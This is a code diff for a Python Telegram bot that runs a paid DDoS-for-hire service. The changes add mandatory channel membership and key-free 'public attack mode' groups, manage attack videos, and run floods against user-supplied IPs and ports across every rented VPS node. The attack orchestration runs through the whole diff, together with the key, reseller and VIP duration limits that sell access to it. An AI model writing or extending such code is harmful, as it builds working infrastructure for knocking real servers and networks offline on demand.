@@ -64,8 +64,14 @@ CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.j
 # --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 def load_config():
-    """Load thread configuration from file with validation"""
-    default_config = {'threads_per_vps': 200}
+    """Load configuration from file"""
+    default_config = {
+        'threads_per_vps': 200,
+        'allowed_group_ids': [-1002569945697],
+        'public_groups': [],
+        'group_settings': {}
+    }
+    
     try:
         if os.path.exists(CONFIG_FILE):
             with open(CONFIG_FILE, 'r') as f:
@@ -86,21 +92,27 @@ def load_config():
 
 # --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-def save_config(threads):
-    """Save thread configuration with strict validation"""
+def save_config(new_threads=None):
+    """Save all configuration data"""
+    global THREADS_PER_VPS
+    
+    if new_threads is not None:
+        THREADS_PER_VPS = new_threads
+    
+    config = {
+        'threads_per_vps': THREADS_PER_VPS,
+        'allowed_group_ids': ALLOWED_GROUP_IDS,
+        'public_groups': PUBLIC_GROUPS,
+        'group_settings': GROUP_SETTINGS
+    }
+    
     try:
-        threads = int(threads)
-        if threads < 100 or threads > 10000:
-            logger.error(f"Invalid thread count {threads}, must be 100-10000")
-            return False
-            
-        config = {'threads_per_vps': threads}
         with open(CONFIG_FILE, 'w') as f:
             json.dump(config, f, indent=4)
-        logger.info(f"Saved new thread count: {threads}")
+        logger.info("Configuration saved successfully")
         return True
     except Exception as e:
-        logger.error(f"Config save failed: {e}")
+        logger.error(f"Error saving config: {e}")
         return False
 
 MIN_THREADS = 100
@@ -142,15 +154,15 @@ ADMIN_FILE = 'admin_data.json'
 VPS_FILE = 'vps_data.json'
 OWNER_FILE = 'owner_data.json'
 RESELLER_FILE = 'reseller_data.json'
-PUBLIC_GROUPS_FILE = 'public_groups.json'
+THREADS_PER_VPS = config.get('threads_per_vps', 200)
+ALLOWED_GROUP_IDS = config.get('allowed_group_ids', [-1002569945697])
+PUBLIC_GROUPS = config.get('public_groups', [])
+GROUP_SETTINGS = config.get('group_settings', {})
 # --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 # --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 last_attack_times = {}
-ALLOWED_GROUP_IDS = []  # List of group IDs where bot is allowed
-PUBLIC_GROUPS = []      # Groups with public attack mode enabled
-GROUP_SETTINGS = {} 
 COOLDOWN_MINUTES = 0
 ATTACK_COOLDOWN = 60  
 VIP_MAX_TIME = 400    
@@ -173,6 +185,9 @@ redeemed_keys = set()
 loop = None
 BOT_ENABLED = True
 BOT_START_TIME = time.time()
+ALLOWED_GROUP_IDS = [-1002569945697]  # Your default group ID
+PUBLIC_GROUPS = []  # List of group IDs where public attacks are allowed
+GROUP_SETTINGS = {}
 ADMIN_MAX_TIME = 600  # Default admin max time
 active_attacks = set()  # Track active attacks
 MAX_CONCURRENT_ATTACKS = 3  # Maximum allowed concurrent attacks
@@ -202,8 +217,28 @@ ATTACK_VIDEOS = [
 def get_random_video():
     return random.choice(ATTACK_VIDEOS)
 
-def check_user_authorization(user_id):
+# फंक्शन में बदलाव (check_user_authorization फंक्शन में)
+def check_user_authorization(user_id, chat_id=None):
     """Check if user is authorized to perform attacks"""
+    
+    # पहले चेक करें कि यूजर ने चैनल जॉइन किया है या नहीं
+    try:
+        chat_member = bot.get_chat_member("@NXTLVLPUBLIC", user_id)
+        if chat_member.status not in ['member', 'administrator', 'creator']:
+            return {
+                'authorized': False,
+                'message': '🚫 *ACCESS DENIED*\n\nआपको पहले हमारे ऑफिशियल चैनल को जॉइन करना होगा!\n\n📢 जॉइन करें: @NXTLVLPUBLIC'
+            }
+    except Exception as e:
+        logger.error(f"Error checking channel membership: {e}")
+        return {
+            'authorized': False,
+            'message': '🚫 *ACCESS DENIED*\n\nचैनल मेम्बरशिप चेक करने में त्रुटि!\n\nकृपया बाद में पुनः प्रयास करें।'
+        }
+    
+    # Check if in public group where attacks are allowed
+    if chat_id and chat_id in PUBLIC_GROUPS:
+        return {'authorized': True, 'message': ''}
     
     # Admins and owner have full access
     if is_admin(user_id) or is_owner(user_id):
@@ -246,6 +281,21 @@ def check_user_authorization(user_id):
         }
 
     return {'authorized': True, 'message': ''}
+
+def is_allowed_group(message):
+    """Check if message is from an allowed group or private chat"""
+    return message.chat.id in ALLOWED_GROUP_IDS or message.chat.type == "private"
+
+def is_authorized_user(user):
+    """Check if user is authorized (admin/owner or has valid key)"""
+    return is_admin(user.id) or is_owner(user.id) or check_user_authorization(user.id)['authorized']
+
+def add_attack_video(video_url):
+    """Add a new video URL to the attack videos list"""
+    if video_url not in ATTACK_VIDEOS:
+        ATTACK_VIDEOS.append(video_url)
+        return True
+    return False
 # --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
@@ -268,63 +318,13 @@ def get_active_vps_list():
             continue
 
     return active_vps
-
-def load_public_groups():
-    """Load public groups from file"""
-    try:
-        if os.path.exists(PUBLIC_GROUPS_FILE):
-            with open(PUBLIC_GROUPS_FILE, 'r') as f:
-                return json.load(f)
-    except Exception as e:
-        logger.error(f"Error loading public groups: {e}")
-    return []
-
-def save_public_groups(groups):
-    """Save public groups to file"""
-    try:
-        with open(PUBLIC_GROUPS_FILE, 'w') as f:
-            json.dump(groups, f)
-        return True
-    except Exception as e:
-        logger.error(f"Error saving public groups: {e}")
-        return False
-
-# Initialize PUBLIC_GROUPS by loading from file
-PUBLIC_GROUPS = load_public_groups()
-
-def is_allowed_group(message):
-    """Check if message is from allowed group or private chat"""
-    return message.chat.id in ALLOWED_GROUP_IDS or message.chat.type == "private"
-
-def save_data():
-    """Save all bot data to JSON files"""
-    with open('keys.json', 'w') as f:
-        json.dump({
-            'keys': keys,
-            'redeemed_keys': list(redeemed_keys),  # Convert set to list
-            'group_settings': GROUP_SETTINGS
-        }, f)
-
-    with open('vps.json', 'w') as f:
-        json.dump(load_vps_data(), f)
-
-def load_data():
-    """Load all bot data from JSON files"""
-    global keys, redeemed_keys, GROUP_SETTINGS
-    
-    if os.path.exists('keys.json'):
-        with open('keys.json', 'r') as f:
-            data = json.load(f)
-            keys = data.get('keys', {})
-            redeemed_keys = set(data.get('redeemed_keys', []))  # Convert list to set
-            GROUP_SETTINGS = data.get('group_settings', {})
 # --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 # --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 def execute_distributed_attack(vps_list, target_ip, target_port, duration, progress_callback=None):
-    """Execute attack across all VPS using configured thread count"""
+    """Execute attack across ALL VPS using configured thread count"""
     success = 0
     failed = 0
     total_vps = len(vps_list)
@@ -332,7 +332,7 @@ def execute_distributed_attack(vps_list, target_ip, target_port, duration, progr
     # Calculate total power for reporting
     total_power = THREADS_PER_VPS * total_vps
     
-    # Execute on all VPS
+    # Execute on ALL VPS
     for index, (ip, details) in enumerate(vps_list, start=1):
         try:
             # Verify binary exists and is executable
@@ -833,7 +833,7 @@ def get_menu_markup(user_id):
         KeyboardButton("📜 Rules"),
         KeyboardButton("💎 VIP Features"),
         KeyboardButton("🧵 Show Threads"),
-        KeyboardButton("⏱️ Bot Uptime")  # यह नया बटन जोड़ें
+        KeyboardButton("⏱️ Bot Uptime")
     ]
     
     if is_admin(user_id):
@@ -847,7 +847,8 @@ def get_menu_markup(user_id):
     if is_owner(user_id):
         buttons.append(KeyboardButton("🖥️ VPS Management"))
         buttons.append(KeyboardButton("👑 Owner Tools"))
-        buttons.append(KeyboardButton("👥 Group Manager"))
+        buttons.append(KeyboardButton("👥 Group Management"))
+        buttons.append(KeyboardButton("🎬 Add Attack Video"))  # यह नया बटन जोड़ा
         status_button = KeyboardButton("🟢 Bot ON" if BOT_ENABLED else "🔴 Bot OFF")
         buttons.append(status_button)
     
@@ -876,19 +877,6 @@ def get_user_list_markup():
         KeyboardButton("🔑 Key Users"),
         KeyboardButton("👑 Admins"),
         KeyboardButton("👨‍💻 Owners"),
-        KeyboardButton("⬅️ Back")
-    ]
-    markup.add(*buttons)
-    return markup
-
-def get_group_management_markup():
-    """Create keyboard for group management"""
-    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    buttons = [
-        KeyboardButton("🌐 Activate Public"),
-        KeyboardButton("❌ Deactivate Public"),
-        KeyboardButton("👥 Add Group"),
-        KeyboardButton("👥 Remove Group"),
         KeyboardButton("⬅️ Back")
     ]
     markup.add(*buttons)
@@ -1030,6 +1018,14 @@ def welcome_start(message):
         save_users(users)
         existing = new_user
 
+    # Check channel membership
+    try:
+        chat_member = bot.get_chat_member("@NXTLVLPUBLIC", user_id)
+        channel_joined = chat_member.status in ['member', 'administrator', 'creator']
+    except Exception as e:
+        logger.error(f"Error checking channel membership: {e}")
+        channel_joined = False
+
     # Determine access status
     status_text = "*🚫 NO ACCESS*"
     expiry_text = ""
@@ -1048,8 +1044,9 @@ def welcome_start(message):
                 expiry_text = f"\n*❌ Key Expired on:* `{expiry_time.strftime('%Y-%m-%d %H:%M:%S')}`"
         else:
             status_text = "*✅ ACTIVE*"
-    else:
-        status_text = "*🚫 NO ACCESS*"
+
+    # Channel join status
+    channel_status = "✅ जॉइन किया हुआ" if channel_joined else "❌ जॉइन नहीं किया"
 
     # Bold welcome message
     welcome_text = (
@@ -1119,7 +1116,7 @@ def process_stylish_broadcast(message):
     from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
     keyboard = InlineKeyboardMarkup()
     keyboard.add(
-        InlineKeyboardButton("📢 𝗝𝗢𝗜𝗡 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/toxicvipgroup12")
+        InlineKeyboardButton("📢 𝗝𝗢𝗜𝗡 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/NXTLVLPUBLIC")
     )
     keyboard.add(
         InlineKeyboardButton("👑 𝗖𝗥𝗘𝗔𝗧𝗢𝗥", url="https://t.me/NEWAADMI")
@@ -1236,8 +1233,8 @@ def attack_command(message):
     chat_id = message.chat.id
     user_id = message.from_user.id
 
-    # Authorization check
-    auth = check_user_authorization(user_id)
+    # Authorization check - pass chat_id for public group verification
+    auth = check_user_authorization(user_id, chat_id)
     if not auth['authorized']:
         bot.send_message(
             chat_id,
@@ -1290,7 +1287,7 @@ def process_attack_command(message, chat_id):
         bot.send_message(chat_id, "🔴 *Bot is currently disabled by admin.*", parse_mode='Markdown')
         return
 
-    auth = check_user_authorization(user_id)
+    auth = check_user_authorization(user_id, chat_id)
     if not auth['authorized']:
         bot.send_message(
             chat_id,
@@ -1328,7 +1325,7 @@ def process_attack_command(message, chat_id):
         if duration > max_time:
             raise ValueError(f"⏱️ Max allowed time: `{max_time}s`")
 
-        # VPS list
+        # Get ALL active VPS (not just a subset)
         vps_list = get_active_vps_list()
         if not vps_list:
             raise ValueError("⚠️ No active VPS nodes available.")
@@ -1354,7 +1351,8 @@ def process_attack_command(message, chat_id):
             parse_mode='Markdown'
         )
 
-        result = execute_distributed_attack(vps_list, target_ip, target_port, duration, threads)
+        # Execute attack on ALL VPS
+        result = execute_distributed_attack(vps_list, target_ip, target_port, duration)
 
         # Final report
         bot.send_message(
@@ -3155,6 +3153,65 @@ def process_reseller_balance_check(message):
         parse_mode='Markdown'
     )
 
+@bot.message_handler(func=lambda message: message.text == "🎬 Add Attack Video" and is_owner(message.from_user.id))
+def add_video_command(message):
+    chat_id = message.chat.id
+    bot.send_message(
+        chat_id,
+        "🎬 *Add New Attack Video*\n\n"
+        "Send the video URL (must be direct MP4 link):\n\n"
+        "Example: https://example.com/attack.mp4\n\n"
+        "❌ Type 'cancel' to abort",
+        reply_markup=ReplyKeyboardRemove(),
+        parse_mode='Markdown'
+    )
+    bot.register_next_step_handler(message, process_video_addition)
+
+def process_video_addition(message):
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+    video_url = message.text.strip()
+    
+    if video_url.lower() == 'cancel':
+        bot.send_message(
+            chat_id,
+            "🚫 Video addition cancelled",
+            reply_markup=get_menu_markup(user_id),
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Simple URL validation
+    if not (video_url.startswith('http') and video_url.endswith(('.mp4', '.MP4'))):
+        bot.send_message(
+            chat_id,
+            "❌ *Invalid URL!*\n\n"
+            "Please provide a direct MP4 video link\n\n"
+            "Example: https://example.com/attack.mp4",
+            reply_markup=get_menu_markup(user_id),
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Add to videos list
+    if add_attack_video(video_url):
+        bot.send_message(
+            chat_id,
+            f"✅ *Video Added Successfully!*\n\n"
+            f"URL: `{video_url}`\n\n"
+            f"Total attack videos now: {len(ATTACK_VIDEOS)}",
+            reply_markup=get_menu_markup(user_id),
+            parse_mode='Markdown'
+        )
+    else:
+        bot.send_message(
+            chat_id,
+            "⚠️ *Video Already Exists!*\n\n"
+            "This video URL is already in the attack videos list",
+            reply_markup=get_menu_markup(user_id),
+            parse_mode='Markdown'
+        )
+
 @bot.message_handler(func=lambda message: message.text == "💸 Add Balance" and is_admin(message.from_user.id))
 def add_reseller_balance_command(message):
     chat_id = message.chat.id
@@ -3220,249 +3277,313 @@ def process_reseller_balance_addition(message):
             parse_mode='Markdown'
         )
 
-@bot.message_handler(func=lambda msg: msg.text == "👥 Group Manager")
-def group_management_menu(message):
-    """Handle group management menu access"""
-    if not is_admin(message.from_user.id):
-        bot.send_message(message.chat.id, "⛔ Access denied!")
-        return
-    bot.send_message(
-        message.chat.id,
-        "👥 Group Management Panel\nSelect an option:",
-        reply_markup=get_group_management_markup()
-    )
-
-@bot.message_handler(func=lambda msg: msg.text == "👥 Add Group")
-def add_group_handler(message):
-    """Add a new allowed group"""
-    if not is_owner(message.from_user.id):
-        bot.send_message(message.chat.id, "🚫 Only owners can add groups!")
-        return
+@bot.message_handler(func=lambda message: message.text == "👥 Group Management" and is_owner(message.from_user.id))
+def group_management(message):
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+    
+    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    buttons = [
+        KeyboardButton("➕ Add Group"),
+        KeyboardButton("➖ Remove Group"),
+        KeyboardButton("🌐 Activate Public"),
+        KeyboardButton("❌ Deactivate Public"),
+        KeyboardButton("📋 Group List"),
+        KeyboardButton("⬅️ Back")
+    ]
+    markup.add(*buttons)
     
     bot.send_message(
-        message.chat.id, 
-        "⚙️ Send the GROUP ID you want to add.\nExample: `-1001234567890`", 
-        parse_mode="Markdown"
+        chat_id,
+        "👥 *Group Management Panel*",
+        reply_markup=markup,
+        parse_mode='Markdown'
     )
-    bot.register_next_step_handler(message, process_add_group)
 
-def process_add_group(message):
-    """Process group addition"""
+@bot.message_handler(func=lambda message: message.text == "➕ Add Group" and is_owner(message.from_user.id))
+def add_group_command(message):
+    chat_id = message.chat.id
+    
+    bot.send_message(
+        chat_id,
+        "✨ *Add New Group*\n\n"
+        "Send the Group ID to add (format: -1001234567890):\n\n"
+        "❌ Type 'cancel' to abort",
+        reply_markup=ReplyKeyboardRemove(),
+        parse_mode='Markdown'
+    )
+    bot.register_next_step_handler(message, process_group_addition)
+
+def process_group_addition(message):
+    chat_id = message.chat.id
+    input_text = message.text.strip()
+    
+    if input_text.lower() == 'cancel':
+        bot.send_message(
+            chat_id,
+            "🚫 Group addition cancelled",
+            reply_markup=get_menu_markup(message.from_user.id),
+            parse_mode='Markdown'
+        )
+        return
+    
     try:
-        group_id = int(message.text.strip())
+        group_id = int(input_text)
         if group_id in ALLOWED_GROUP_IDS:
-            bot.send_message(message.chat.id, "⚠️ This group is already in the allowed list.")
+            bot.send_message(
+                chat_id,
+                f"⚠️ Group `{group_id}` is already allowed!",
+                parse_mode='Markdown',
+                reply_markup=get_menu_markup(message.from_user.id)
+            )
             return
+            
         ALLOWED_GROUP_IDS.append(group_id)
         bot.send_message(
-            message.chat.id, 
-            f"✅ Group ID `{group_id}` added successfully!", 
-            parse_mode="Markdown",
-            reply_markup=get_group_management_markup()
+            chat_id,
+            f"✅ *Group Added Successfully!*\n\n"
+            f"Group ID: `{group_id}`\n\n"
+            "Now members can use bot commands in this group.",
+            parse_mode='Markdown',
+            reply_markup=get_menu_markup(message.from_user.id)
         )
-    except Exception as e:
-        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
+        
+    except ValueError:
+        bot.send_message(
+            chat_id,
+            "❌ *Invalid Group ID!*\n\n"
+            "Please send a numeric ID in format: -1001234567890",
+            parse_mode='Markdown',
+            reply_markup=get_menu_markup(message.from_user.id)
+        )
 
-@bot.message_handler(func=lambda msg: msg.text == "👥 Remove Group")
-def remove_group_handler(message):
-    """Remove an allowed group"""
-    if not is_owner(message.from_user.id):
-        bot.send_message(message.chat.id, "🚫 Only owners can remove groups!")
-        return
+@bot.message_handler(func=lambda message: message.text == "➖ Remove Group" and is_owner(message.from_user.id))
+def remove_group_command(message):
+    chat_id = message.chat.id
     
     if not ALLOWED_GROUP_IDS:
-        bot.send_message(message.chat.id, "⚠️ No groups in the allowed list!")
+        bot.send_message(
+            chat_id,
+            "❌ No groups in allowed list!",
+            parse_mode='Markdown',
+            reply_markup=get_menu_markup(message.from_user.id)
+        )
         return
     
-    groups_list = "\n".join(f"{i+1}. `{gid}`" for i, gid in enumerate(ALLOWED_GROUP_IDS))
+    response = "📋 *Allowed Groups*\n\n"
+    for i, group_id in enumerate(ALLOWED_GROUP_IDS, 1):
+        response += f"{i}. `{group_id}`\n"
+    
+    response += "\nEnter the number of group to remove:\n❌ Type 'cancel' to abort"
+    
     bot.send_message(
-        message.chat.id, 
-        f"⚙️ Choose group number to remove:\n\n{groups_list}", 
-        parse_mode="Markdown"
+        chat_id,
+        response,
+        parse_mode='Markdown',
+        reply_markup=ReplyKeyboardRemove()
     )
-    bot.register_next_step_handler(message, process_remove_group)
+    bot.register_next_step_handler(message, process_group_removal)
 
-def process_remove_group(message):
-    """Process group removal"""
+def process_group_removal(message):
+    chat_id = message.chat.id
+    input_text = message.text.strip()
+    
+    if input_text.lower() == 'cancel':
+        bot.send_message(
+            chat_id,
+            "🚫 Group removal cancelled",
+            reply_markup=get_menu_markup(message.from_user.id),
+            parse_mode='Markdown'
+        )
+        return
+    
     try:
-        idx = int(message.text.strip()) - 1
-        if 0 <= idx < len(ALLOWED_GROUP_IDS):
-            removed_group = ALLOWED_GROUP_IDS.pop(idx)
+        index = int(input_text) - 1
+        if 0 <= index < len(ALLOWED_GROUP_IDS):
+            removed_group = ALLOWED_GROUP_IDS.pop(index)
+            if removed_group in PUBLIC_GROUPS:
+                PUBLIC_GROUPS.remove(removed_group)
             bot.send_message(
-                message.chat.id, 
-                f"✅ Removed Group ID `{removed_group}`", 
-                parse_mode="Markdown",
-                reply_markup=get_group_management_markup()
+                chat_id,
+                f"✅ *Group Removed!*\n\n"
+                f"Group ID: `{removed_group}`",
+                parse_mode='Markdown',
+                reply_markup=get_menu_markup(message.from_user.id)
             )
         else:
-            bot.send_message(message.chat.id, "❌ Invalid choice!")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
-
-@bot.message_handler(func=lambda msg: msg.text == "🌐 Activate Public")
-def activate_public(message):
-    """Activate public attack mode for a group"""
-    if not is_owner(message.from_user.id):
-        bot.send_message(message.chat.id, "⛔ Only owner can activate public mode!")
-        return
-    
-    markup = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
-    for group_id in ALLOWED_GROUP_IDS:
-        if group_id in PUBLIC_GROUPS:  # Skip already public groups
-            continue
-        try:
-            chat = bot.get_chat(group_id)
-            markup.add(KeyboardButton(f"🌐 {chat.title}"))
-        except:
-            continue
-    
-    if len(markup.keyboard) == 0:  # No groups available
+            raise ValueError("Invalid index")
+    except ValueError:
         bot.send_message(
-            message.chat.id, 
-            "⚠️ All allowed groups already have public mode active!", 
-            reply_markup=get_group_management_markup()
+            chat_id,
+            "❌ *Invalid Selection!*\n\n"
+            "Please enter a valid number from the list",
+            parse_mode='Markdown',
+            reply_markup=get_menu_markup(message.from_user.id)
+        )
+
+@bot.message_handler(func=lambda message: message.text == "🌐 Activate Public" and is_owner(message.from_user.id))
+def activate_public_command(message):
+    chat_id = message.chat.id
+    
+    if not ALLOWED_GROUP_IDS:
+        bot.send_message(
+            chat_id,
+            "❌ No groups in allowed list!",
+            parse_mode='Markdown',
+            reply_markup=get_menu_markup(message.from_user.id)
         )
         return
     
-    markup.add(KeyboardButton("❌ Cancel"))
+    response = "📋 *Allowed Groups*\n\n"
+    for i, group_id in enumerate(ALLOWED_GROUP_IDS, 1):
+        status = " (Public)" if group_id in PUBLIC_GROUPS else ""
+        response += f"{i}. `{group_id}`{status}\n"
+    
+    response += "\nEnter the number of group to make public:\n❌ Type 'cancel' to abort"
     
     bot.send_message(
-        message.chat.id,
-        "🛠️ Select a group for public attacks (150s limit):",
-        reply_markup=markup
+        chat_id,
+        response,
+        parse_mode='Markdown',
+        reply_markup=ReplyKeyboardRemove()
     )
-    bot.register_next_step_handler(message, process_public_group_selection)
+    bot.register_next_step_handler(message, process_public_activation)
 
-def process_public_group_selection(message):
-    """Process group selection for public mode"""
-    if message.text == "❌ Cancel":
+def process_public_activation(message):
+    chat_id = message.chat.id
+    input_text = message.text.strip()
+    
+    if input_text.lower() == 'cancel':
         bot.send_message(
-            message.chat.id,
-            "🚫 Public mode activation cancelled.",
-            reply_markup=get_group_management_markup()
+            chat_id,
+            "🚫 Public activation cancelled",
+            reply_markup=get_menu_markup(message.from_user.id),
+            parse_mode='Markdown'
         )
         return
     
-    selected_title = message.text[2:]  # Remove the 🌐 prefix
-    selected_group = None
-    
-    for group_id in ALLOWED_GROUP_IDS:
-        try:
-            chat = bot.get_chat(group_id)
-            if chat.title == selected_title:
-                selected_group = group_id
-                break
-        except:
-            continue
-    
-    if not selected_group:
-        bot.send_message(
-            message.chat.id,
-            "❌ Group not found!",
-            reply_markup=get_group_management_markup()
-        )
-        return
-    
-    # Add the selected group to public groups list
-    if selected_group not in PUBLIC_GROUPS:
-        PUBLIC_GROUPS.append(selected_group)
-        save_public_groups(PUBLIC_GROUPS)  # Save to file
-    
-    bot.send_message(
-        message.chat.id,
-        f"✅ Public mode activated for {selected_title}!\n"
-        "Max duration: 150\n"
-        "Max threads: 100\n"
-        "No key required",
-        reply_markup=get_group_management_markup()
-    )
-    
-    # Send announcement to the selected group
     try:
+        index = int(input_text) - 1
+        if 0 <= index < len(ALLOWED_GROUP_IDS):
+            group_id = ALLOWED_GROUP_IDS[index]
+            if group_id not in PUBLIC_GROUPS:
+                PUBLIC_GROUPS.append(group_id)
+                bot.send_message(
+                    chat_id,
+                    f"✅ *Public Mode Activated!*\n\n"
+                    f"Group ID: `{group_id}`\n\n"
+                    "Now anyone in this group can launch attacks without a key!\n"
+                    "Max duration: 150 seconds",
+                    parse_mode='Markdown',
+                    reply_markup=get_menu_markup(message.from_user.id)
+                )
+            else:
+                bot.send_message(
+                    chat_id,
+                    f"⚠️ Group `{group_id}` is already public!",
+                    parse_mode='Markdown',
+                    reply_markup=get_menu_markup(message.from_user.id)
+                )
+        else:
+            raise ValueError("Invalid index")
+    except ValueError:
         bot.send_message(
-            selected_group,
-            "🌐 PUBLIC ATTACK MODE ACTIVATED!\n\n"
-            "Anyone can now launch attacks with limitations:\n"
-            "- Max duration: 150s\n"
-            "- Max threads: 100\n"
-            "- No key required\n\n"
-            "Use the attack command as usual!"
+            chat_id,
+            "❌ *Invalid Selection!*\n\n"
+            "Please enter a valid number from the list",
+            parse_mode='Markdown',
+            reply_markup=get_menu_markup(message.from_user.id)
         )
-    except Exception as e:
-        logger.error(f"Could not send public mode announcement: {e}")
-
-@bot.message_handler(func=lambda msg: msg.text == "❌ Deactivate Public")
-def deactivate_public_start(message):
-    """Start deactivation of public attack mode"""
-    if not is_owner(message.from_user.id):
-        bot.send_message(message.chat.id, "❌ Only owner can deactivate public mode!")
-        return
-
+        
+@bot.message_handler(func=lambda message: message.text == "❌ Deactivate Public" and is_owner(message.from_user.id))
+def deactivate_public_command(message):
+    chat_id = message.chat.id
+    
     if not PUBLIC_GROUPS:
-        bot.send_message(message.chat.id, "ℹ️ Public mode is not active on any group.")
+        bot.send_message(
+            chat_id,
+            "❌ No groups in public mode!",
+            parse_mode='Markdown',
+            reply_markup=get_menu_markup(message.from_user.id)
+        )
         return
-
-    markup = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
-
-    for group_id in PUBLIC_GROUPS:
-        try:
-            chat = bot.get_chat(group_id)
-            markup.add(KeyboardButton(f"❌ {chat.title}"))
-        except:
-            markup.add(KeyboardButton(f"❌ Unknown Group ({group_id})"))
-
-    markup.add(KeyboardButton("❌ Cancel"))
-
+    
+    response = "📋 *Public Groups*\n\n"
+    for i, group_id in enumerate(PUBLIC_GROUPS, 1):
+        response += f"{i}. `{group_id}`\n"
+    
+    response += "\nEnter the number of group to remove from public mode:\n❌ Type 'cancel' to abort"
+    
     bot.send_message(
-        message.chat.id,
-        "Select group(s) to deactivate public mode:",
-        reply_markup=markup
+        chat_id,
+        response,
+        parse_mode='Markdown',
+        reply_markup=ReplyKeyboardRemove()
     )
-    bot.register_next_step_handler(message, process_deactivate_public_selection)
+    bot.register_next_step_handler(message, process_public_deactivation)
 
-def process_deactivate_public_selection(message):
-    """Process deactivation of public mode"""
-    if message.text == "❌ Cancel":
+def process_public_deactivation(message):
+    chat_id = message.chat.id
+    input_text = message.text.strip()
+    
+    if input_text.lower() == 'cancel':
         bot.send_message(
-            message.chat.id,
-            "❌ Deactivation cancelled.",
-            reply_markup=get_group_management_markup()
+            chat_id,
+            "🚫 Public deactivation cancelled",
+            reply_markup=get_menu_markup(message.from_user.id),
+            parse_mode='Markdown'
         )
         return
-
-    selected_title = message.text[2:]  # remove ❌ emoji
-
-    # Find which group was selected
-    selected_group = None
-    for group_id in PUBLIC_GROUPS:  # Changed from ALLOWED_GROUP_IDS to PUBLIC_GROUPS
-        try:
-            chat = bot.get_chat(group_id)
-            if chat.title == selected_title:
-                selected_group = group_id
-                break
-        except:
-            if f"Unknown Group ({group_id})" == selected_title:
-                selected_group = group_id
-                break
-
-    if selected_group:
-        PUBLIC_GROUPS.remove(selected_group)
-        save_public_groups(PUBLIC_GROUPS)  # Save to file
-        try:
-            bot.send_message(selected_group, "❌ PUBLIC ATTACK MODE HAS BEEN DEACTIVATED.")
-        except:
-            pass
+    
+    try:
+        index = int(input_text) - 1
+        if 0 <= index < len(PUBLIC_GROUPS):
+            group_id = PUBLIC_GROUPS.pop(index)
+            bot.send_message(
+                chat_id,
+                f"✅ *Public Mode Deactivated!*\n\n"
+                f"Group ID: `{group_id}`",
+                parse_mode='Markdown',
+                reply_markup=get_menu_markup(message.from_user.id)
+            )
+        else:
+            raise ValueError("Invalid index")
+    except ValueError:
         bot.send_message(
-            message.chat.id,
-            f"✅ Public mode deactivated for {selected_title}.",
-            reply_markup=get_group_management_markup()
+            chat_id,
+            "❌ *Invalid Selection!*\n\n"
+            "Please enter a valid number from the list",
+            parse_mode='Markdown',
+            reply_markup=get_menu_markup(message.from_user.id)
         )
+
+@bot.message_handler(func=lambda message: message.text == "📋 Group List" and is_admin(message.from_user.id))
+def list_groups_command(message):
+    chat_id = message.chat.id
+    
+    response = "📋 *Group Information*\n\n"
+    
+    if ALLOWED_GROUP_IDS:
+        response += "🔹 *Allowed Groups:*\n"
+        for group_id in ALLOWED_GROUP_IDS:
+            status = " (Public)" if group_id in PUBLIC_GROUPS else ""
+            response += f"- `{group_id}`{status}\n"
     else:
-        bot.send_message(
-            message.chat.id,
-            "❌ Selected group not found in public groups list.",
-            reply_markup=get_group_management_markup()
-        )
+        response += "❌ No allowed groups\n"
+    
+    if PUBLIC_GROUPS:
+        response += "\n🔹 *Public Groups (no key required):*\n"
+        for group_id in PUBLIC_GROUPS:
+            response += f"- `{group_id}`\n"
+    else:
+        response += "\n❌ No public groups\n"
+    
+    bot.send_message(
+        chat_id,
+        response,
+        parse_mode='Markdown',
+        reply_markup=get_menu_markup(message.from_user.id)
+    )
 
 @bot.message_handler(func=lambda m: m.text == "💻 Run Command" and is_owner(m.from_user.id))
 def handle_custom_command_prompt(message):
@@ -4468,6 +4589,7 @@ def redeem_key(message):
             parse_mode='Markdown',
             reply_markup=get_menu_markup(user_id)
         )
+
 @bot.message_handler(func=lambda message: len(message.text.split()) == 3)
 def handle_attack_command(message):
     global active_attacks, last_attack_times
@@ -4479,25 +4601,15 @@ def handle_attack_command(message):
     if not is_allowed_group(message):
         bot.send_message(
             chat_id,
-            "⛔ This group is not authorized to use the bot!",
+            "🚫 *ACCESS DENIED*\n\n"
+            "This bot can only be used in authorized groups or private chats.",
             parse_mode='Markdown'
         )
         return
 
-    # Check if public mode is active for this group
-    is_public = message.chat.id in PUBLIC_GROUPS and not is_admin(user_id)
+    # Check if this is a public group attack
+    is_public = message.chat.id in PUBLIC_GROUPS and not is_authorized_user(message.from_user)
     
-    # Skip authorization check for public mode
-    if not is_public:
-        auth = check_user_authorization(user_id)
-        if not auth['authorized']:
-            bot.send_message(
-                chat_id,
-                f"🔒 Access Denied\n{auth['message']}",
-                parse_mode='Markdown'
-            )
-            return
-
     # 🔒 Bot Disabled Check
     if not BOT_ENABLED:
         bot.send_message(
@@ -4510,44 +4622,74 @@ def handle_attack_command(message):
         )
         return
 
+    # Authorization check for non-public groups
+    if not is_public:
+        auth = check_user_authorization(user_id)
+        if not auth['authorized']:
+            bot.send_message(
+                chat_id,
